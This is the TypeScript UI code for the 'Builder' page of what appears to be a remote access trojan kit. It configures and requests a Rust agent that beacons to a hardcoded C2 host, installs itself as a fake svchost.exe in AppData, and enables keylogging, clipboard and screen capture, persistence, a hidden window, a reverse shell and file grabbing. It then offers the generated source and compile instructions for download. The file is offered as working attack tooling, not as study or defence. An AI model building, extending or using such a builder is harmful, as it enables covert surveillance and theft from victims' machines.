import { api, type BuildConfig } from "./api.js";
import { toast } from "./toast.js";

const state: BuildConfig = {
  host: "windowssys.hidenmc.com",
  port: 443,
  format: "exe",
  obfuscation: "none",
  icon: "chrome",
  mutex: "HC-" + Math.random().toString(36).slice(2, 10).toUpperCase(),
  installPath: "%APPDATA%\\Microsoft\\svchost.exe",
  features: {
    keylogger: true,
    clipboard: true,
    screenshot: true,
    persistence: true,
    hideWindow: true,
    antiVM: false,
    disableAV: false,
    reverseShell: true,
    webcam: false,
    fileGrabber: true,
  },
};

export function renderBuilder(): string {
  return `
    <h1>Builder</h1>
    <p class="page-sub">Generate a Rust agent. URL and user ID are auto-detected from your session.</p>

    <div class="builder-layout">
      <div class="card builder-cfg">
        <div class="builder-section">
          <h3>Build Configuration</h3>
          <label>Build Name</label>
          <input id="b-name" value="hidencloud-agent" placeholder="Build name" />

          <div class="toggle-option">
            <span>Enable Startup Persistence</span>
            <label class="toggle"><input type="checkbox" id="b-startup" checked /><span class="toggle-slider"></span></label>
          </div>

          <div class="toggle-option">
            <span>Enable Debug Mode</span>
            <label class="toggle"><input type="checkbox" id="b-debug" /><span class="toggle-slider"></span></label>
          </div>
        </div>

        <div class="builder-section">
          <h3>Agent Modules</h3>
          <div class="feature-grid" id="b-features">
            ${Object.keys(state.features).map((k) => `
              <label class="feature-toggle">
                <input type="checkbox" data-feat="${k}" ${state.features[k] ? "checked" : ""} />
                <span class="feature-name">${featureLabel(k)}</span>
              </label>`).join("")}
          </div>
        </div>
      </div>

      <div class="card builder-preview">
        <div class="preview-header">
          <div class="preview-icon">⚡</div>
          <div>
            <div class="preview-title" id="preview-title">hidencloud-agent.exe</div>
            <div class="muted" id="preview-target" style="font-size:11px">windowssys.hidenmc.com/&lt;auto&gt;</div>
          </div>
        </div>

        <div class="preview-stats">
          <div><span>Language</span><strong>Rust</strong></div>
          <div><span>Format</span><strong>EXE</strong></div>
          <div><span>Startup</span><strong id="preview-startup">Enabled</strong></div>
          <div><span>Debug</span><strong id="preview-debug">Off</strong></div>
        </div>

        <h4 class="preview-h">Enabled modules</h4>
        <div class="preview-features" id="preview-features"></div>

        <div class="build-log" id="build-log">
          <div class="muted">Ready. Press Create Build to generate the Rust agent.</div>
        </div>

        <button class="primary build-btn" id="b-build">Create Build</button>
      </div>
    </div>
  `;
}

function featureLabel(k: string): string {
  return k.replace(/([A-Z])/g, " $1").replace(/^./, (s) => s.toUpperCase());
}

export function bindBuilder(root: HTMLElement): void {
  const $ = <T extends HTMLElement>(sel: string) => root.querySelector<T>(sel)!;

  const nameInput = $<HTMLInputElement>("#b-name");
  const startupCb = $<HTMLInputElement>("#b-startup");
  const debugCb = $<HTMLInputElement>("#b-debug");

  function update(): void {
    const name = nameInput.value || "hidencloud-agent";
    $("#preview-title").textContent = `${name}.exe`;
    $("#preview-startup").textContent = startupCb.checked ? "Enabled" : "Disabled";
    $("#preview-debug").textContent = debugCb.checked ? "On" : "Off";
    state.features.persistence = startupCb.checked;
    $("#preview-features").innerHTML = Object.entries(state.features)
      .filter(([, v]) => v)
      .map(([k]) => `<span class="feat-chip">${featureLabel(k)}</span>`)
      .join("") || `<span class="muted">No modules enabled</span>`;
  }

  nameInput.addEventListener("input", update);
  startupCb.addEventListener("change", update);
  debugCb.addEventListener("change", update);

  root.querySelectorAll<HTMLInputElement>("#b-features input").forEach((cb) =>
    cb.addEventListener("change", () => {
      state.features[cb.dataset["feat"]!] = cb.checked;
      update();
    }),
  );

  const log = $<HTMLDivElement>("#build-log");
  const buildBtn = $<HTMLButtonElement>("#b-build");
  buildBtn.addEventListener("click", async () => {
    buildBtn.disabled = true;
    buildBtn.textContent = "Building…";
    log.innerHTML = "";
    const buildName = nameInput.value || "hidencloud-agent";
    const debug = debugCb.checked;

    const steps = [
      "Initializing Rust project structure…",
      "Writing rustagent/src/main.rs…",
      "Writing rustagent/Cargo.toml…",
      `Configuring ${Object.values(state.features).filter(Boolean).length} modules…`,
      debug ? "Debug mode enabled — console output active…" : "Release mode — console hidden…",
      "Embedding C2 URL with auto-detected user ID…",
      "Finalizing build…",
    ];
    for (const s of steps) {
      await new Promise((r) => setTimeout(r, 300));
      const line = document.createElement("div");
      line.className = "build-line";
      line.textContent = "▸ " + s;
      log.appendChild(line);
      log.scrollTop = log.scrollHeight;
    }
    try {
      state.features.persistence = startupCb.checked;
      const res = await api.build({ ...state, buildName, debug } as any);
      const done = document.createElement("div");
      done.className = "build-line ok";
      done.textContent = `✓ Build "${buildName}" generated — ${(res as any).c2Url} (uid: ${(res as any).userId})`;
      log.appendChild(done);

      // Download main.rs
      const blob = new Blob([res.contents], { type: "text/plain" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url; a.download = "main.rs";
      a.textContent = "Download main.rs";
      a.className = "download-link";
      log.appendChild(a);

      // Download Cargo.toml
      if ((res as any).cargoContents) {
        const cb2 = new Blob([(res as any).cargoContents], { type: "text/plain" });
        const cu = URL.createObjectURL(cb2);
        const ca = document.createElement("a");
        ca.href = cu; ca.download = "Cargo.toml";
        ca.textContent = "Download Cargo.toml";
        ca.className = "download-link";
        log.appendChild(ca);
      }

      const info = document.createElement("div");
      info.className = "build-line";
      info.innerHTML = `<span class="muted">Place files in rustagent/ and run:</span> cargo build --release`;
      log.appendChild(info);

      toast(`Build "${buildName}" created`, "success");
    } catch (err) {
      const line = document.createElement("div");
      line.className = "build-line err";
      line.textContent = "✗ " + (err instanceof Error ? err.message : "Build failed");
      log.appendChild(line);
      toast("Build failed", "warn");
    } finally {
      buildBtn.disabled = false;
      buildBtn.textContent = "Create Build";
    }
  });

  update();
}
